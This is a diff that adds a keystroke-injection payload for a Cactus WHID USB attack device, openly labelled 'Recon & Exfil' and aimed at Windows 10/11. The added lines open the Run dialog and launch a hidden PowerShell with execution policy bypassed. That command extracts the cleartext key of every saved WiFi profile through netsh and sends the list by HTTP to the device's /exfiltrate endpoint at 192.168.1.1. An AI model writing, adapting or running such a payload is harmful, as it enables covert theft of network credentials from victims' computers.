@@ -1,0 +1,10 @@
+REM === Cactus WHID Payload: Exfil WiFi Creds to Cactus SPIFFS ===
+REM Target: Windows 10/11
+REM Category: Recon & Exfil
+REM Description: Extracts WiFi passwords and sends them back to the Cactus device itself
+REM Uses the ESPloit /exfiltrate endpoint - no external server needed
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -W Hidden -Exec Bypass -C "$r='';(netsh wlan show profiles)|Select-String '\:(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name=$n key=clear)|Select-String 'Key Content\W+\:(.+)$';if($p){$r+=\"$n`:$($p.Matches.Groups[1].Value.Trim()),\"}};Invoke-WebRequest -Uri \"http://192.168.1.1/exfiltrate?file=wificreds.txt&data=$r\" -UseBasicParsing"
+ENTER
